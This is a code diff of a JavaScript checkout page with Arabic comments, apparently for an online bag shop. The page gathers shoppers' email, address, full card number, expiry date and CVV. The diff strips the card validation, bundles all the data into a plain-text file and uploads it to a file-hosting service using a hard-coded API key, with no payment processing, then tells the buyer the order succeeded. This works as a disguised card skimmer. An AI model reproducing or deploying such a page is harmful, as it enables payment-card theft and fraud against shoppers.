@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', function () {
   const form = document.getElementById('checkout-form');
-  const submitButton = document.getElementById('submit-button'); // افترض أن الزر يحمل الـ ID "submit-button"
+  const submitButton = document.getElementById('submit-button'); // التأكد من أن الزر هو نفسه
 
   // استخراج المعلمات من الرابط
   function getUrlParams() {
@@ -23,32 +23,29 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // عرض الصورة
   const productImage = document.getElementById('product-image');
-  const productImageContainer = document.querySelector('.product-info');
 
   if (urlParams.image) {
-    // التأكد من أن الصورة ليست فارغة
     productImage.src = urlParams.image;  // تعيين رابط الصورة
-    productImage.alt = `${urlParams.name || 'Product'} image`;  // إضافة نص بديل للصورة
+    productImage.alt = `${urlParams.name || 'Product'} image`;
     productImage.style.display = 'block';  // إظهار الصورة
   } else {
-    // إذا كانت الصورة غير موجودة أو فارغة، عرض صورة افتراضية
     productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';  // صورة افتراضية
     productImage.alt = 'No Image Available';
-    productImage.style.display = 'block';  // إظهار الصورة
+    productImage.style.display = 'block';
   }
 
   // عرض الكمية
-  const productQuantity = parseInt(urlParams.quantity, 10) || 1; // تعيين الكمية الافتراضية إلى 1 إذا لم يتم إرسالها
+  const productQuantity = parseInt(urlParams.quantity, 10) || 1;
   document.getElementById('product-quantity').textContent = `Quantity: ${productQuantity}`;
 
   // حساب السعر الإجمالي
-  const productPrice = parseFloat(urlParams.price) || 0; // تحويل السعر إلى عدد عشري
-  const totalPrice = (productPrice * productQuantity).toFixed(2); // حساب السعر الإجمالي
+  const productPrice = parseFloat(urlParams.price) || 0;
+  const totalPrice = (productPrice * productQuantity).toFixed(2);
   document.getElementById('total-price').textContent = `Total Price: $${totalPrice}`;
 
   // إضافة مستمع للإرسال
   form.addEventListener('submit', function (event) {
-    event.preventDefault();  // منع إعادة تحميل الصفحة عند الإرسال
+    event.preventDefault();
 
     // جمع البيانات من الحقول
     const email = document.getElementById('email').value;
@@ -63,15 +60,8 @@ document.addEventListener('DOMContentLoaded', function () {
     const expiry = document.getElementById('expiry').value;
     const cvv = document.getElementById('cvv').value;
 
-    // معلومات المنتج
-    const productName = document.getElementById('product-name').textContent.split(': ')[1];  // اسم المنتج
-    const productPriceText = document.getElementById('product-price').textContent.split(': ')[1];  // سعر المنتج
-    const productQuantityText = document.getElementById('product-quantity').textContent.split(': ')[1];  // كمية المنتج
-    const productImageUrl = urlParams.productImage || '';  // رابط الصورة
-
-    // تحقق من القيم
+    // تحقق من صحة البيانات
     let isValid = true;
-
     removeErrorMessages();  // إزالة رسائل الخطأ السابقة
 
     // تحقق من الحقول الفارغة
@@ -80,34 +70,10 @@ document.addEventListener('DOMContentLoaded', function () {
         showErrorMessage('Please fill out all required fields.', 'general');
     }
 
-    // تحقق من صحة البريد الإلكتروني
+    // التحقق من صحة البريد الإلكتروني
     if (!validateEmail(email)) {
         isValid = false;
         showErrorMessage('Please enter a valid email address.', 'email');
-    }
-
-    // تحقق من اسم حامل البطاقة
-    if (!validateCardName(cardName)) {
-        isValid = false;
-        showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
-    }
-
-    // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
-    if (!validateCard(cardNumber)) {
-        isValid = false;
-        showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
-    }
-
-    // تحقق من تاريخ الصلاحية
-    if (!validateExpiry(expiry)) {
-        isValid = false;
-        showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
-    }
-
-    // تحقق من CVV
-    if (!validateCVV(cvv)) {
-        isValid = false;
-        showErrorMessage('Please enter a valid CVV number.', 'cvv');
     }
 
     if (isValid) {
@@ -115,19 +81,20 @@ document.addEventListener('DOMContentLoaded', function () {
         submitButton.textContent = 'يتم التحميل الآن';
         submitButton.disabled = true;
 
-        // تغيير لون الحقول إلى لون غامق
+        // تغيير لون الحقول إلى لون غامق للإشارة إلى أن البيانات تُرسل
         const fields = form.querySelectorAll('input');
         fields.forEach(field => {
-            field.style.backgroundColor = '#f0f0f0';  // خلفية فاتحة للإشارة إلى أن البيانات يتم إرسالها
-            field.style.color = '#555';  // تغيير اللون النصي
+            field.style.backgroundColor = '#e0e0e0';  // تغيير الخلفية إلى اللون الرمادي
+            field.style.color = '#555';  // تغيير لون النص إلى اللون الغامق
+            field.disabled = true;  // تعطيل الحقول لمنع التعديل أثناء التحميل
         });
 
-        // إنشاء محتوى الملف النصي مع بيانات المنتج
-        const orderData = ` 
+        // تجهيز البيانات لإرسالها
+        const orderData = `
             Email: ${email}
             First Name: ${firstName}
             Last Name: ${lastName}
-            Street_House_Apartment_Unit: ${streetHouseApartmentUnit}
+            Address: ${streetHouseApartmentUnit}
             City: ${city}
             State: ${state}
             Zip Code: ${zipCode}
@@ -137,34 +104,38 @@ document.addEventListener('DOMContentLoaded', function () {
             CVV: ${cvv}
 
             --- Product Details ---
-            Product Name: ${productName}
-            Product Price: $${productPriceText}
-            Product Quantity: ${productQuantityText}
-            Product Image URL: ${productImageUrl}
+            Product Name: ${urlParams.name}
+            Product Price: $${urlParams.price}
+            Quantity: ${productQuantity}
             Total Price: $${totalPrice}
         `;
-        
-        // تحويل البيانات إلى Blob (بيانات ثنائية)
+
         const blob = new Blob([orderData], { type: 'text/plain' });
 
-        // إعدادات Filestack API
         const apiKey = 'A7fSrsBg3RjybN1kkK99lz'; // استبدل بـ API Key الخاص بك
         const client = filestack.init(apiKey);
 
         // رفع الملف إلى Filestack
         client.upload(blob)
             .then(result => {
-                // عند نجاح رفع الملف
                 alert('Your order has been successfully placed and saved to Filestack!');
-                window.location.href = 'https://checkout.glamhavenbags.shop/thank-you.html';  // إعادة توجيه إلى صفحة الشكر
-                console.log(result);  // تفاصيل رفع الملف
+                window.location.href = 'https://checkout.glamhavenbags.shop/thank-you.html';
+                console.log(result);
             })
             .catch(error => {
-                // في حال حدوث خطأ
                 console.error('Error uploading file to Filestack:', error);
                 alert('Something went wrong, please try again later.');
-                submitButton.textContent = 'إكمال الشراء'; // إعادة النص إلى الأصل
-                submitButton.disabled = false; // إعادة تمكين الزر
+
+                // إعادة النص إلى إكمال الشراء وتمكين الزر
+                submitButton.textContent = 'Complete Purchase';
+                submitButton.disabled = false;
+
+                // إعادة تمكين الحقول
+                fields.forEach(field => {
+                    field.style.backgroundColor = ''; // إعادة اللون إلى الأصل
+                    field.style.color = '';  // إعادة النص إلى اللون الأصلي
+                    field.disabled = false;  // إعادة تمكين الحقول
+                });
             });
     }
   });
